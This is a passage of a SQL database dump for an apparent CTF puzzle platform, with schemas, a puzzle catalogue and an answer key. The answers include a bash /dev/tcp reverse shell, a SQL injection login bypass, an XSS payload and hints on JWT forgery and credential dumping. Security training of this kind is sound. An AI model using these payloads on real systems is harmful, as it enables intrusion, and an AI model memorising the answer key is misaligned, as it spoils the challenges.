-- phpMyAdmin SQL Dump
-- version 5.1.1deb5ubuntu1
-- https://www.phpmyadmin.net/
--
-- Host: localhost:3306
-- Generation Time: Dec 26, 2025 at 03:15 PM
-- Server version: 8.0.35-0ubuntu0.22.04.1
-- PHP Version: 8.1.2-1ubuntu2.19

SET SQL_MODE = "NO_AUTO_VALUE_ON_ZERO";
START TRANSACTION;
SET time_zone = "+00:00";


/*!40101 SET @OLD_CHARACTER_SET_CLIENT=@@CHARACTER_SET_CLIENT */;
/*!40101 SET @OLD_CHARACTER_SET_RESULTS=@@CHARACTER_SET_RESULTS */;
/*!40101 SET @OLD_COLLATION_CONNECTION=@@COLLATION_CONNECTION */;
/*!40101 SET NAMES utf8mb4 */;

--
-- Database: `CypherStore`
--

-- --------------------------------------------------------

--
-- Table structure for table `BurstRushSessions`
--

CREATE TABLE `BurstRushSessions` (
  `id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `puzzle_id` int NOT NULL,
  `session_start` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `session_end` timestamp NULL DEFAULT NULL,
  `questions_answered` int DEFAULT '0',
  `correct_answers` int DEFAULT '0',
  `current_streak` int DEFAULT '0',
  `max_streak` int DEFAULT '0',
  `total_points_earned` int DEFAULT '0',
  `status` enum('active','completed','abandoned') COLLATE utf8mb4_unicode_ci DEFAULT 'active'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `ChatMessages`
--

CREATE TABLE `ChatMessages` (
  `id` int NOT NULL,
  `room_id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `message` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `ChatMessages`
--

INSERT INTO `ChatMessages` (`id`, `room_id`, `user_id`, `message`, `created_at`) VALUES
(1, 1, 0, 'Ace was here', '2025-12-10 10:21:45'),
(2, 1, 0, 'へ            ╱|       ૮  -   ՛ )  ♡   (`   -  7.           /   ⁻  ៸|         |、⁻〵  乀 (ˍ, ل ل         じしˍ,)ノ', '2025-12-10 14:52:08'),
(3, 1, 0, '₍ᐢ.  ̫.ᐢ₎', '2025-12-10 14:52:42'),
(4, 1, 0, 'Check this out', '2025-12-11 21:42:02'),
(14, 1, 0, 'hell', '2025-12-17 21:07:31'),
(15, 1, 0, 'henwo', '2025-12-18 07:24:29');

-- --------------------------------------------------------

--
-- Table structure for table `ContactMessages`
--

CREATE TABLE `ContactMessages` (
  `id` int NOT NULL,
  `user_id` int UNSIGNED DEFAULT NULL,
  `name` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `email` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `subject` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `message` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `status` enum('new','read','responded') CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'new',
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `OverclockScores`
--

CREATE TABLE `OverclockScores` (
  `id` int NOT NULL,
  `user_id` int UNSIGNED NOT NULL,
  `difficulty` enum('Easy','Medium','Hard') COLLATE utf8mb4_unicode_ci NOT NULL,
  `puzzles_completed` int NOT NULL DEFAULT '0',
  `score` int NOT NULL DEFAULT '0',
  `max_streak` int NOT NULL DEFAULT '0',
  `played_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

-- --------------------------------------------------------

--
-- Table structure for table `PuzzleQuestions`
--

CREATE TABLE `PuzzleQuestions` (
  `id` int NOT NULL,
  `question` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `answer` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `hints` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `puzzleid` int NOT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `PuzzleQuestions`
--

INSERT INTO `PuzzleQuestions` (`id`, `question`, `answer`, `hints`, `puzzleid`) VALUES
(1, 'Decrypt: KHOOR ZRUOG', 'HELLO WORLD', 'Each letter is shifted by 3 positions in the alphabet', 1),
(2, 'What framework is the site built with?', 'Bootstrap', 'Check the HTML source code for framework indicators', 2),
(3, 'Find the hidden admin page path', '/secret-admin', 'Try checking robots.txt or common admin paths', 2),
(4, 'What is the flag hidden in the page source?', 'FLAG{hidden_treasure}', 'Use Ctrl+U or F12 Developer Tools', 2),
(5, 'What is the decoded message?', 'Cypher Deck is awesome', 'ROT13 shifts each letter 13 positions in the alphabet', 3),
(6, 'What word is hidden in the binary?', 'Hello', 'Convert each 8-bit group to ASCII character', 4),
(7, 'What is the decrypted message?', 'HELLO WORLD', 'Use the key CRYPTO to decrypt each letter', 5),
(8, 'How many characters are in the key?', '6', 'Count the letters in CRYPTO', 5),
(9, 'What is the final decoded message?', 'What is the final answer?', 'Decode multiple times - it is Base64 encoded twice', 6),
(10, 'What are the prime factors of n=3233?', '61,53', 'Factor the semiprime to find p and q', 7),
(11, 'What is the decrypted message?', '123', 'Use the factors to calculate d, then decrypt c', 7),
(12, 'What is the flag in the HTML comments?', 'FLAG{html_comments_are_visible}', 'View page source with Ctrl+U or right-click > View Page Source', 8),
(13, 'What is the auth token value?', 'SECRET_TOKEN_12345', 'Open Developer Tools (F12) and check the Application/Storage tab', 9),
(14, 'What SQL payload bypasses the login?', '\' OR \'1\'=\'1', 'Think about how to make the WHERE clause always true', 10),
(15, 'What is the admin username?', 'administrator', 'Once logged in, check the dashboard', 10),
(16, 'What payload triggers the XSS?', '<script>alert(1)</script>', 'Try injecting JavaScript in the search field', 11),
(17, 'What is the admin cookie name?', 'admin_session', 'Use document.cookie to view available cookies', 11),
(18, 'What is the secret key?', 'supersecret', 'Try common weak secrets or bruteforce', 12),
(19, 'What role should be in the forged token?', 'admin', 'Change the role claim in the JWT payload', 12),
(20, 'What are the GPS coordinates?', '51.5074,-0.1278', 'Use exiftool or check EXIF data in image properties', 13),
(21, 'What message is hidden in the LSBs?', 'FLAG{steganography_rules}', 'Extract the least significant bit from each pixel', 14),
(22, 'What message appears in the spectrogram?', 'HIDDEN_MESSAGE', 'Use Audacity or similar tool to view frequency analysis', 15),
(23, 'What is the password for the ZIP file?', 'polyglot123', 'Extract the ZIP using binwalk or manual hex editing', 16),
(24, 'What file is inside the archive?', 'flag.txt', 'Unzip the archive once extracted', 16),
(25, 'What is the decoded message?', 'SECRET_CODE', 'Tabs and spaces represent binary - decode accordingly', 17),
(26, 'What file type has signature FF D8 FF?', 'JPEG', 'Look up magic bytes in a file signature database', 18),
(27, 'What was in the deleted file?', 'PASSWORD:recovery123', 'Use photorec, testdisk, or similar recovery tools', 19),
(28, 'What username was sent over HTTP?', 'admin', 'Filter for HTTP traffic and look at POST requests', 20),
(29, 'What was the password?', 'P@ssw0rd123', 'Check the same HTTP POST request body', 20),
(30, 'What suspicious process is running?', 'malware.exe', 'Use volatility pslist plugin', 21),
(31, 'What is the process ID?', '1337', 'Note the PID of the suspicious process', 21),
(32, 'What is the C2 server IP address?', '192.168.1.100', 'Analyze network connections or strings in the binary', 22),
(33, 'What port does it connect to?', '4444', 'Check the connection details', 22),
(34, 'On which platform is cyph3rmaster most active?', 'github', 'Search the username across major social platforms', 23),
(35, 'What is their real name?', 'John Smith', 'Check profile information on found accounts', 23),
(36, 'What dork finds exposed .env files?', 'filetype:env', 'Use Google advanced search operators', 24),
(37, 'What sensitive key is in the exposed file?', 'API_KEY_12345', 'Open one of the found .env files', 24),
(38, 'What city is this photo taken in?', 'London', 'Look for recognizable landmarks and metadata', 25),
(39, 'What famous building is visible?', 'Big Ben', 'Identify the landmark in the background', 25),
(40, 'What is the sender\'s real IP address?', '203.0.113.42', 'Check the Received: headers in reverse order', 26),
(41, 'What email client was used?', 'Outlook', 'Look at the X-Mailer header', 26),
(42, 'What is the CEO\'s email address?', 'ceo@example.com', 'Search breach databases and LinkedIn', 27),
(43, 'What document was leaked?', 'financial_report_2024.pdf', 'Search for company name + leaked documents', 27),
(44, 'What flag is visible in the strings?', 'FLAG{strings_are_easy}', 'Use strings command or a hex editor', 28),
(45, 'What is the correct password?', 'ReverseMe', 'Debug the binary and analyze the comparison logic', 29),
(46, 'What algorithm is used for checking?', 'strcmp', 'Identify the function used for password comparison', 29),
(47, 'What anti-debug technique is used?', 'IsDebuggerPresent', 'Analyze the binary for debugger detection', 30),
(48, 'What is the hidden flag?', 'FLAG{no_debuggers_allowed}', 'Bypass the anti-debug check to reveal the flag', 30),
(49, 'What is the decryption key?', 'ANTI_DEBUG_KEY', 'Find the key used after bypassing protection', 30),
(50, 'What port is running SSH?', '22', 'Common SSH port number', 31),
(51, 'What is the target IP address?', '192.168.1.100', 'Look at the nmap output addresses', 31),
(52, 'What ARP source IP is spoofing?', '192.168.1.50', 'Check the duplicate ARP requests', 32),
(53, 'What file can be exploited for privesc?', '/usr/bin/sudo', 'Look for SUID bits', 33),
(54, 'What is the buffer size?', '256', 'Check stack frame size', 34),
(55, 'What is the reverse shell command?', 'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1', 'Common bash reverse shell', 35),
(56, 'What is the admin username?', 'administrator', 'Default AD admin name', 36),
(57, 'What is the kernel version?', '5.4.0', 'Check kernel version string', 37),
(58, 'What service is vulnerable?', 'smb', 'Check for unpatched services', 38),
(59, 'What credential storage location?', 'lsass.exe', 'Windows credential dumping', 39),
(60, 'What port for C2 communication?', '8080', 'Check firewall rules and traffic', 40);

-- --------------------------------------------------------

--
-- Table structure for table `PuzzleStore`
--

CREATE TABLE `PuzzleStore` (
  `id` int NOT NULL,
  `title` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `description` text CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci,
  `category` varchar(100) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `difficulty` enum('Easy','Medium','Hard') CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci NOT NULL,
  `created_by` int UNSIGNED NOT NULL,
  `created_at` timestamp NULL DEFAULT CURRENT_TIMESTAMP,
  `puzzle_type` enum('mini','full') CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT 'full',
  `is_burstrush` tinyint(1) DEFAULT '0',
  `points_per_question` int DEFAULT NULL,
  `max_questions_per_session` int DEFAULT NULL,
  `time_limit_per_question` int DEFAULT NULL,
  `base_points` int DEFAULT '100',
  `rating` decimal(2,1) DEFAULT '0.0',
  `rating_count` int DEFAULT '0',
  `tags` varchar(255) CHARACTER SET utf8mb4 COLLATE utf8mb4_unicode_ci DEFAULT '',
  `time_limit_base` int DEFAULT '300',
  `time_limit_turbo` int DEFAULT '240',
  `time_limit_hyper` int DEFAULT '180',
  `time_limit_thermal` int DEFAULT '120'
) ENGINE=InnoDB DEFAULT CHARSET=utf8mb4 COLLATE=utf8mb4_unicode_ci;

--
-- Dumping data for table `PuzzleStore`
--

INSERT INTO `PuzzleStore` (`id`, `title`, `description`, `category`, `difficulty`, `created_by`, `created_at`, `puzzle_type`, `is_burstrush`, `points_per_question`, `max_questions_per_session`, `time_limit_per_question`, `base_points`, `rating`, `rating_count`, `tags`, `time_limit_base`, `time_limit_turbo`, `time_limit_hyper`, `time_limit_thermal`) VALUES
(1, 'Caesar Cipher Basics', 'Decrypt this Caesar cipher with shift 3', 'Cryptography', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 100, '0.0', 0, 'crypto,beginner,cipher', 300, 240, 180, 120),
(2, 'Web Detective Case', 'Investigate a suspicious website and find hidden information', 'Web Hacking', 'Medium', 0, '2025-11-02 10:18:30', 'full', 1, 10, NULL, NULL, 250, '0.0', 0, 'web,investigation,osint', 300, 240, 180, 120),
(3, 'ROT13 Message', 'Decode this simple substitution cipher: Pvcure Qrpx vf njrfbzr!', 'Cryptography', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 50, '4.2', 15, 'crypto,beginner,substitution', 300, 240, 180, 120),
(4, 'Binary to Text', 'Convert this binary to ASCII: 01001000 01100101 01101100 01101100 01101111', 'Cryptography', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 75, '4.5', 22, 'crypto,binary,encoding', 240, 180, 120, 60),
(5, 'Vigenere Cipher', 'Decrypt this Vigenere cipher. Key: CRYPTO. Ciphertext: MCVTQ VRMXC UGKAN', 'Cryptography', 'Medium', 0, '2025-11-02 10:18:30', 'full', 1, 10, NULL, NULL, 150, '3.8', 12, 'crypto,vigenere,polyalphabetic', 600, 480, 360, 240),
(6, 'Base64 Layers', 'Decode this multi-layered Base64: VjJoaGRDQnBjeUIwYUdVZ1ptbHVZV3dnWVc1emQyVnlQdz09', 'Cryptography', 'Medium', 0, '2025-11-02 10:18:30', 'mini', 0, NULL, NULL, NULL, 125, '4.0', 18, 'crypto,encoding,base64', 480, 360, 240, 180),
(7, 'RSA Challenge', 'Factor this semiprime and decrypt the message. n=3233, e=17, c=2201', 'Cryptography', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 300, '4.7', 8, 'crypto,rsa,advanced', 900, 720, 540, 360),
(8, 'Hidden Comments', 'Find the flag hidden in HTML comments on this webpage', 'Web Hacking', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 60, '4.3', 20, 'web,html,beginner', 180, 120, 90, 60),
(9, 'Cookie Inspector', 'Inspect browser cookies to find the hidden authentication token', 'Web Hacking', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 80, '4.1', 17, 'web,cookies,devtools', 240, 180, 120, 90),
(10, 'SQL Injection Basics', 'Bypass login authentication using SQL injection. Username field is vulnerable', 'Web Hacking', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 175, '3.9', 14, 'web,sql,injection', 600, 480, 360, 240),
(11, 'XSS Playground', 'Find and exploit a reflected XSS vulnerability to steal admin cookies', 'Web Hacking', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 200, '4.2', 11, 'web,xss,javascript', 720, 540, 420, 300),
(12, 'JWT Token Forgery', 'Forge a JWT token to gain admin access. Algorithm: HS256', 'Web Hacking', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 350, '4.8', 6, 'web,jwt,advanced', 1200, 900, 720, 480),
(13, 'Image Metadata', 'Extract GPS coordinates from this JPEG EXIF data', 'Steganography', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 70, '4.4', 19, 'stego,metadata,exif', 300, 240, 180, 120),
(14, 'LSB Extraction', 'Extract hidden message from image using Least Significant Bit method', 'Steganography', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 90, '4.0', 16, 'stego,lsb,images', 360, 300, 240, 180),
(15, 'Audio Spectrogram', 'Analyze audio file spectrogram to reveal hidden message', 'Steganography', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 180, '3.7', 10, 'stego,audio,frequency', 600, 480, 360, 240),
(16, 'ZIP in PNG', 'Extract hidden ZIP archive embedded in PNG file structure', 'Steganography', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 160, '4.1', 13, 'stego,polyglot,archives', 540, 420, 300, 240),
(17, 'Whitespace Encoding', 'Decode message hidden in whitespace characters (tabs/spaces)', 'Steganography', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 280, '4.6', 7, 'stego,whitespace,advanced', 900, 720, 540, 360),
(18, 'File Signature', 'Identify file type by examining hex signature (magic bytes)', 'Forensics', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 65, '4.2', 18, 'forensics,hex,files', 240, 180, 120, 90),
(19, 'Deleted File Recovery', 'Recover deleted text file from disk image using recovery tools', 'Forensics', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 0, NULL, NULL, NULL, 85, '3.9', 15, 'forensics,recovery,disk', 360, 300, 240, 180),
(20, 'Network Packet Analysis', 'Analyze PCAP file to find credentials sent over HTTP', 'Forensics', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 190, '4.3', 12, 'forensics,wireshark,network', 720, 600, 480, 360),
(21, 'Memory Dump Analysis', 'Extract running processes from memory dump using Volatility', 'Forensics', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 210, '4.0', 9, 'forensics,memory,volatility', 900, 720, 540, 420),
(22, 'Malware Analysis', 'Reverse engineer malware sample to find C2 server address', 'Forensics', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 400, '4.9', 5, 'forensics,malware,reversing', 1800, 1440, 1080, 720),
(23, 'Username Search', 'Find social media profiles associated with username: cyph3rmaster', 'OSINT', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 55, '4.1', 21, 'osint,recon,social', 300, 240, 180, 120),
(24, 'Google Dorking', 'Use Google dorks to find exposed configuration files', 'OSINT', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 1, 10, NULL, NULL, 75, '4.4', 17, 'osint,google,search', 360, 300, 240, 180),
(25, 'Geolocation Challenge', 'Identify exact location from photo using landmarks and metadata', 'OSINT', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 140, '3.8', 11, 'osint,geolocation,mapping', 600, 480, 360, 240),
(26, 'Email Investigation', 'Trace email origin and identify sender using email headers', 'OSINT', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 165, '4.2', 14, 'osint,email,headers', 540, 420, 300, 240),
(27, 'Corporate Espionage', 'Find leaked company documents and executive information', 'OSINT', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 320, '4.5', 8, 'osint,breach,advanced', 1200, 960, 720, 540),
(28, 'String Analysis', 'Find the flag by examining strings in the binary', 'Reverse Engineering', 'Easy', 0, '2025-11-02 10:18:30', 'mini', 0, NULL, NULL, NULL, 80, '4.3', 16, 'reverse,strings,binary', 300, 240, 180, 120),
(29, 'Crackme Basic', 'Reverse engineer password checking algorithm', 'Reverse Engineering', 'Medium', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 220, '3.9', 10, 'reverse,crackme,debugging', 900, 720, 540, 420),
(30, 'Anti-Debug Binary', 'Bypass anti-debugging techniques to extract flag', 'Reverse Engineering', 'Hard', 0, '2025-11-02 10:18:30', 'full', 0, NULL, NULL, NULL, 450, '4.8', 4, 'reverse,anti-debug,advanced', 2400, 1800, 1440, 1080),
(31, 'Network Scanning Basics', 'Identify open ports using nmap output analysis', 'Red Team', 'Easy', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 95, '4.0', 12, 'red_team,reconnaissance,nmap', 300, 240, 180, 120),
(32, 'ARP Spoofing Detection', 'Analyze packet captures to detect ARP spoofing attacks', 'Red Team', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 185, '3.8', 9, 'red_team,network,attacks,pcap', 600, 480, 360, 240),
(33, 'Privilege Escalation Path', 'Find the privilege escalation vector in a system', 'Red Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 380, '4.5', 6, 'red_team,privesc,linux,windows', 900, 720, 540, 360),
(34, 'Buffer Overflow Basics', 'Understand stack buffer overflows and find the overflow input', 'Red Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 420, '4.2', 8, 'red_team,exploit,binary,memory', 1200, 900, 720, 480),
(35, 'Reverse Shell Generation', 'Generate a reverse shell payload for target system', 'Red Team', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 160, '3.9', 7, 'red_team,shells,payloads,post-exploitation', 480, 360, 240, 180),
(36, 'Active Directory Enumeration', 'Extract user and group information from Active Directory', 'Red Team', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 210, '4.1', 10, 'red_team,windows,ldap,enumeration', 720, 540, 420, 300),
(37, 'Kernel Exploit Analysis', 'Analyze kernel vulnerability and exploitation method', 'Red Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 450, '4.6', 5, 'red_team,kernel,exploit,linux', 1800, 1440, 1080, 720),
(38, 'Lateral Movement Techniques', 'Identify lateral movement methods in compromised network', 'Red Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 380, '4.3', 7, 'red_team,lateral_movement,network', 1200, 900, 720, 480),
(39, 'Credential Harvesting', 'Extract credentials from memory and saved locations', 'Red Team', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 175, '3.7', 8, 'red_team,credentials,dumping,windows', 540, 420, 300, 240),
(40, 'Command & Control Setup', 'Establish C2 server and client communication', 'Red Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 500, '4.4', 5, 'red_team,c2,post_exploitation,networking', 2400, 1800, 1440, 1080),
(41, 'Intrusion Detection Evasion', 'Detect and identify evaded attack patterns in logs', 'Blue Team', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 220, '4.2', 11, 'blue_team,detection,evasion,logs', 720, 540, 420, 300),
(42, 'Firewall Rule Analysis', 'Review firewall rules and identify misconfigurations', 'Blue Team', 'Easy', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 85, '3.9', 9, 'blue_team,firewall,network,rules', 360, 300, 240, 180),
(43, 'Incident Response Timeline', 'Build attack timeline from system logs and artifacts', 'Blue Team', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 200, '4.0', 10, 'blue_team,incident_response,timeline,forensics', 900, 720, 540, 420),
(44, 'Malware Sandbox Analysis', 'Analyze malware behavior in sandbox environment', 'Blue Team', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 190, '4.1', 8, 'blue_team,malware,sandbox,analysis', 600, 480, 360, 240),
(45, 'Log Aggregation & Analysis', 'Extract meaningful insights from aggregated logs', 'Blue Team', 'Easy', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 95, '3.8', 7, 'blue_team,logs,siem,analysis', 480, 360, 240, 180),
(46, 'Network Segmentation', 'Design secure network segments and access controls', 'Blue Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 350, '4.3', 6, 'blue_team,network,segmentation,defense', 1200, 900, 720, 480),
(47, 'Vulnerability Patching Priority', 'Prioritize and patch critical vulnerabilities', 'Blue Team', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 165, '3.9', 9, 'blue_team,patching,vulnerability,risk', 540, 420, 300, 240),
(48, 'Threat Intelligence Integration', 'Incorporate threat intelligence into defense strategy', 'Blue Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 400, '4.2', 7, 'blue_team,threat_intelligence,detection', 1500, 1200, 900, 600),
(49, 'Data Loss Prevention', 'Implement DLP policies to prevent data exfiltration', 'Blue Team', 'Medium', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 210, '4.0', 8, 'blue_team,dlp,data_protection,policy', 900, 720, 540, 420),
(50, 'Security Audit & Compliance', 'Conduct security audit and verify compliance', 'Blue Team', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 380, '4.1', 6, 'blue_team,audit,compliance,governance', 1200, 900, 720, 480),
(51, 'AES Encryption Analysis', 'Analyze AES encrypted data and attack vectors', 'Cryptography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 320, '4.4', 7, 'crypto,aes,encryption,advanced', 900, 720, 540, 360),
(52, 'Hash Collision Attack', 'Find hash collisions using brute force techniques', 'Cryptography', 'Hard', 0, '2025-12-09 11:34:23', 'mini', 0, NULL, NULL, NULL, 290, '4.2', 5, 'crypto,hashing,collisions,attacks', 1200, 900, 720, 480),
(53, 'Diffie-Hellman Key Exchange', 'Implement and analyze Diffie-Hellman exchange', 'Cryptography', 'Medium', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 200, '3.9', 8, 'crypto,key_exchange,dh,protocol', 720, 540, 420, 300),
(54, 'One-Time Pad Weaknesses', 'Identify OTP implementation flaws and exploits', 'Cryptography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 350, '4.5', 4, 'crypto,otp,stream_cipher,advanced', 1500, 1200, 900, 600),
(55, 'Homomorphic Encryption Intro', 'Understand homomorphic encryption and applications', 'Cryptography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 400, '4.3', 3, 'crypto,homomorphic,advanced,theoretical', 2400, 1800, 1440, 1080),
(56, 'Server-Side Template Injection', 'Exploit SSTI vulnerabilities in template engines', 'Web Hacking', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 380, '4.4', 5, 'web,ssti,template,injection,advanced', 1200, 900, 720, 480),
(57, 'NoSQL Injection', 'Perform NoSQL injection attacks on MongoDB', 'Web Hacking', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 195, '4.0', 9, 'web,nosql,injection,mongodb', 720, 540, 420, 300),
(58, 'WebSocket Security', 'Analyze and exploit insecure WebSocket communications', 'Web Hacking', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 180, '3.8', 7, 'web,websocket,communication,security', 600, 480, 360, 240),
(59, 'CORS Misconfiguration', 'Exploit misconfigured CORS policies', 'Web Hacking', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 165, '3.9', 8, 'web,cors,policy,browser,security', 540, 420, 300, 240),
(60, 'GraphQL Injection', 'Find and exploit GraphQL API vulnerabilities', 'Web Hacking', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 350, '4.2', 6, 'web,graphql,api,injection,advanced', 1200, 900, 720, 480),
(61, 'Dark Web Reconnaissance', 'Conduct reconnaissance on dark web platforms', 'OSINT', 'Medium', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 210, '4.0', 7, 'osint,dark_web,reconnaissance,investigation', 900, 720, 540, 420),
(62, 'DNS Enumeration & Analysis', 'Extract information from DNS records and zones', 'OSINT', 'Easy', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 90, '3.9', 10, 'osint,dns,enumeration,recon', 480, 360, 240, 180),
(63, 'Employee Information Gathering', 'Compile intelligence on target employees', 'OSINT', 'Medium', 0, '2025-12-09 11:34:23', 'full', 1, 10, NULL, NULL, 185, '3.8', 8, 'osint,employees,social_engineering,recon', 720, 540, 420, 300),
(64, 'Infrastructure Mapping', 'Map and analyze target infrastructure', 'OSINT', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 320, '4.1', 6, 'osint,infrastructure,mapping,reconnaissance', 1200, 900, 720, 480),
(65, 'Breach Database Search', 'Search and verify compromised credentials', 'OSINT', 'Easy', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 70, '4.0', 12, 'osint,breaches,credentials,verification', 360, 300, 240, 180),
(66, 'MP3 Steganography Extraction', 'Extract hidden message from MP3 metadata', 'Steganography', 'Medium', 0, '2025-12-09 11:34:23', 'mini', 1, 10, NULL, NULL, 175, '3.9', 6, 'stego,audio,mp3,metadata', 600, 480, 360, 240),
(67, 'Video Frame Analysis', 'Find hidden data in video frame pixel values', 'Steganography', 'Medium', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 220, '4.0', 5, 'stego,video,frames,pixels', 900, 720, 540, 420),
(68, 'PDF Steganography', 'Extract hidden content from PDF files', 'Steganography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 310, '4.1', 4, 'stego,pdf,advanced,extraction', 1200, 900, 720, 480),
(69, 'Network Covert Channels', 'Detect and analyze covert network channels', 'Steganography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 360, '4.3', 3, 'stego,covert_channels,network,advanced', 1500, 1200, 900, 600),
(70, 'Timing-Based Sidechannel', 'Exploit timing sidechannels in cryptographic implementations', 'Steganography', 'Hard', 0, '2025-12-09 11:34:23', 'full', 0, NULL, NULL, NULL, 400, '4.2', 3, 'stego,sidechannel,timing,advanced', 1800, 1440, 1080, 720);

-- --------------------------------------------------------

--
-- Table structure for table `Rooms`
--

CREATE TABLE `Rooms` (
  `id` int NOT NULL,
